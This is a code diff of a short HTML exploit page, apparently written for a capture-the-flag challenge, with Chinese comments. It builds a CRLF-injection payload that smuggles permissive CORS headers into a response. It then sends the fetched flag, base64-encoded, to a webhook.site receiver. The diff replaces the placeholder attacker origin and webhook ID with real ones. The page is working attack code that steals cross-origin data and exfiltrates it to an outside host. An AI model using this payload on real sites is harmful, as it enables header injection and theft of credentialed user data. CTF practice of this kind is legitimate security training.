@@ -4,7 +4,7 @@
     <h1>Fetching Flag...</h1>
     <script>
         // 1. 替换为你托管此代码的实际 Origin
-        const attackerOrigin = "https://attacker.com"; 
+        const attackerOrigin = "https://dlameng.github.io/ctf-payloads/test.html"; 
         
         // 2. 准备 CRLF 注入的 Payload
         const payload = `ALLOW-FROM ${attackerOrigin}\r\nAccess-Control-Allow-Origin: ${attackerOrigin}\r\nAccess-Control-Allow-Credentials: true`;
@@ -21,7 +21,7 @@
         .then(flagData => {
             // 5. 将获取到的 Flag 发送到你的 Webhook 接收器
             // 请将下面的 URL 替换为你自己的 webhook.site 地址
-            fetch("https://webhook.site/YOUR-WEBHOOK-ID?flag=" + btoa(flagData));
+            fetch("https://webhook.site/66f51224-5934-406d-b640-6ea91d854b04?flag=" + btoa(flagData));
         })
         .catch(err => console.error("Error:", err));
     </script>
